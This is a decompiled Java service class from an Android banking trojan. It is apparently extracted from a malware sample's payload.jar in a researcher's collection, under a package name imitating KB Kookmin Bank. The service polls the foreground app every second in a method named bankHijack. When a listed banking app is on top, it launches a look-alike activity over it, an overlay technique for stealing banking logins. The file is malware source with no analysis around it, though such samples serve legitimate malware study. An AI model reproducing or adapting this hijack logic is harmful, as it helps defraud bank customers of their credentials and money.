package com.kbstar.kb.android.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.util.Timer;
import java.util.TimerTask;

public class SoftService
  extends Service
{
  private static final long BANK_TOP_CHECK_TIME = 1000L;
  private final String DEBUG_TAG = "clService";
  private TimerTask mTimerTask;
  public boolean threadDisable = true;
  private Timer timer;
  
  /* Error */
  private void bankHijack()
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: aload_0
    //   3: invokevirtual 38	com/kbstar/kb/android/services/SoftService:getApplicationContext	()Landroid/content/Context;
    //   6: ldc 40
    //   8: invokevirtual 46	android/content/Context:getSystemService	(Ljava/lang/String;)Ljava/lang/Object;
    //   11: checkcast 48	android/app/ActivityManager
    //   14: iconst_1
    //   15: invokevirtual 52	android/app/ActivityManager:getRunningTasks	(I)Ljava/util/List;
    //   18: astore_3
    //   19: aload_3
    //   20: invokeinterface 58 1 0
    //   25: ifle +32 -> 57
    //   28: aload_3
    //   29: iconst_0
    //   30: invokeinterface 62 2 0
    //   35: checkcast 64	android/app/ActivityManager$RunningTaskInfo
    //   38: getfield 68	android/app/ActivityManager$RunningTaskInfo:topActivity	Landroid/content/ComponentName;
    //   41: invokevirtual 74	android/content/ComponentName:getPackageName	()Ljava/lang/String;
    //   44: astore_3
    //   45: iconst_0
    //   46: istore_1
    //   47: getstatic 80	com/kbstar/kb/android/star/AppContacts:BK_ARRAY_LIST	[Ljava/lang/String;
    //   50: arraylength
    //   51: istore_2
    //   52: iload_1
    //   53: iload_2
    //   54: if_icmplt +6 -> 60
    //   57: aload_0
    //   58: monitorexit
    //   59: return
    //   60: aload_3
    //   61: getstatic 80	com/kbstar/kb/android/star/AppContacts:BK_ARRAY_LIST	[Ljava/lang/String;
    //   64: iload_1
    //   65: aaload
    //   66: invokevirtual 86	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   69: ifeq +100 -> 169
    //   72: aload_0
    //   73: ldc 88
    //   75: iconst_0
    //   76: invokevirtual 92	com/kbstar/kb/android/services/SoftService:getSharedPreferences	(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   79: invokeinterface 98 1 0
    //   84: astore 4
    //   86: aload 4
    //   88: invokeinterface 103 1 0
    //   93: pop
    //   94: aload 4
    //   96: invokeinterface 107 1 0
    //   101: pop
    //   102: aload 4
    //   104: ldc 109
    //   106: getstatic 112	com/kbstar/kb/android/star/AppContacts:BK_CALL_LIST	[Ljava/lang/String;
    //   109: iload_1
    //   110: aaload
    //   111: invokeinterface 116 3 0
    //   116: pop
    //   117: aload 4
    //   119: invokeinterface 107 1 0
    //   124: pop
    //   125: new 70	android/content/ComponentName
    //   128: dup
    //   129: ldc 118
    //   131: ldc 120
    //   133: invokespecial 123	android/content/ComponentName:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   136: astore 4
    //   138: new 125	android/content/Intent
    //   141: dup
    //   142: invokespecial 126	android/content/Intent:<init>	()V
    //   145: astore 5
    //   147: aload 5
    //   149: aload 4
    //   151: invokevirtual 130	android/content/Intent:setComponent	(Landroid/content/ComponentName;)Landroid/content/Intent;
    //   154: pop
    //   155: aload 5
    //   157: ldc -125
    //   159: invokevirtual 135	android/content/Intent:addFlags	(I)Landroid/content/Intent;
    //   162: pop
    //   163: aload_0
    //   164: aload 5
    //   166: invokevirtual 139	com/kbstar/kb/android/services/SoftService:startActivity	(Landroid/content/Intent;)V
    //   169: iload_1
    //   170: iconst_1
    //   171: iadd
    //   172: istore_1
    //   173: goto -126 -> 47
    //   176: astore_3
    //   177: aload_0
    //   178: monitorexit
    //   179: aload_3
    //   180: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	181	0	this	SoftService
    //   46	127	1	i	int
    //   51	4	2	j	int
    //   18	43	3	localObject1	Object
    //   176	4	3	localObject2	Object
    //   84	66	4	localObject3	Object
    //   145	20	5	localIntent	Intent
    // Exception table:
    //   from	to	target	type
    //   2	45	176	finally
    //   47	52	176	finally
    //   60	169	176	finally
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    Log.v("clService", "onCreate");
    this.timer = new Timer();
    this.mTimerTask = new TimerTask()
    {
      public void run()
      {
        SoftService.this.bankHijack();
      }
    };
    this.timer.schedule(this.mTimerTask, 1000L, 1000L);
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    this.threadDisable = true;
    Log.v("clService", "on destroy");
    if (this.timer != null)
    {
      this.timer.cancel();
      this.timer = null;
    }
    if (this.mTimerTask != null)
    {
      this.mTimerTask.cancel();
      this.mTimerTask = null;
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/services/SoftService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */